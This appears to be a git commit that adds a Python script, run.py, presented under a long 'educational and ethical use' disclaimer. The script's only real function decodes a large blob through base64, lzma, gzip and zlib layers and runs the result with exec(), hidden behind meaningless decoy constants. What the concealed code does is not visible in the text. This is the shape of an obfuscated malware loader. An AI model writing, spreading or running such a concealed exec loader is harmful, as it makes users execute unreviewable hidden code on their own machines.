8fbe82049ec987dfac5f5bde39143cd86131c461
𝗧𝗲𝗮𝗺 𝗜𝗖𝗦𝗙 <icsf00000@gmail.com>
2026-04-11 00:44:00 +0600

    Create run.py

---
+++ run.py
@@ -0,0 +1,47 @@
+# ===============================================================================
+# ⚠️  CAUTION / WARNING
+# --------------------------------------------------------------------------------------------------
+# This program is created for educational, testing, and research purposes only.
+# The developer is not responsible for any misuse, illegal activity, or damage caused by this code.
+#
+# If you are using this script, make sure you have proper authorization and permission
+# before running it on any system, server, network, or website.
+#
+# Unauthorized testing, scanning, or attacking systems without permission may violate
+# cybersecurity laws and could lead to serious legal consequences.
+#
+# Always use this tool responsibly, ethically, and only in controlled environments
+# such as your own lab, test server, or systems where you have full permission.
+#
+# By running this program you agree that you understand the risks and you take full
+# responsibility for how this code is used.
+# --------------------------------------------------------------------------------------------------
+# Developed for learning, experimentation, and ethical cybersecurity practice.
+# ==================================================================================================
+
+ICSF_SECURE_YQQPKGRWRH = 'e5jbDXyGtHwV3LYXwlb3ZHjEMpC2ma86jroEm8TD0kXGQsbS7eo6rgl009v9xczaQrOxmrbGh1ha8X8j'
+ICSF_SECURE_BXTNFTMVOJ = 'MpkzcuOH2sPc1TRiFCXc1VwAGY68tm6Fo4WbtvhFAF0AK2GREKXNdqU0TXqtrC1kJY21d7JEFveDzuNB'
+ICSF_SECURE_GAQFXXBADD = 'L23EY1r9l8lSDcV5IIoFPEb7kYEb9KuXXYOc5zxZn14lKLVDic7rxK5Pmnx7U2Z9J0XzSqG6SQl0HNIG'
+ICSF_SECURE_IEOEOELVUH = 'deInJUFdW6wFTwKENZFXRGwLlCsakGwkbpl2W0lGgS3a8lP6gwaV7lKTndAhME41ThvUnePfMBkQSEBd'
+ICSF_SECURE_GOJVFQYDED = 'nvu4qGhApmkCdqYTNxu5IOMIQUNVPXAEisia8HDiV1lXlRmjrkrnbY4NyGmq9IruAkgIChrDeajrdtWd'
+ICSF_SECURE_TBNLVEUMNE = '8yGdHNmezHqgurHbeT6cdA7Gy33GCCO55ugrlckY8RmxjOrJSXhTV9fArgtWdpahEFTO0VW8N23jEHTX'
+ICSF_SECURE_ZXZMRFVILD = 'DSXCVX688l2LMSub3O744vpQOdRAxtoyWpEDtVuF8Oj9t57pYEXSg1oGRKsn5hydhZu3IwSCfX9nwSP4'
+ICSF_SECURE_YULDZWILNL = 'efbom7hTblbUfsVQaKiT7tth8trufXJJDWe6J9HhXfafvX6HQeF318o7WUWrE93p1Bl53cAS7yXFunII'
+
+import base64,zlib,gzip,lzma,sys,os
+
+def ICSF_AUTH_LOADER():
+    # 
+    ICSF_PAYLOAD = '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'
+    try:
+        # 
+        decoded = base64.b64decode(ICSF_PAYLOAD)
+        l3 = lzma.decompress(decoded)
+        l2 = gzip.decompress(l3)
+        l1 = zlib.decompress(l2).decode('utf-8')
+        exec(l1)
+    except Exception as e:
+        print("Module Error: Contact @somser_sa")
+
+if __name__ == "__main__":
+    ICSF_AUTH_LOADER()
